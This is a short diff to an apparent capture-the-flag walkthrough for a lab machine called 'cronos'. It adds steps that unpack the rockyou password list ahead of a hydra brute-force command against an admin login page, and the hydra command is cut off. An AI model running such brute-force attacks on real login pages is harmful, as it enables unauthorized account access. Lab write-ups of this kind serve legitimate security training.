@@ -104,6 +104,8 @@ In the background, run the following login bruteforce attempt based on the login
 ![admin_login](./cronos/admin_login.png)
 
 ```bash
+cp /usr/share/wordlists/rockyou.txt.gz .
+gunzip rockyou.txt.gz
 # assuming the user "admin" exists ...
 hydra -vV -f -I\
   -l cronos \
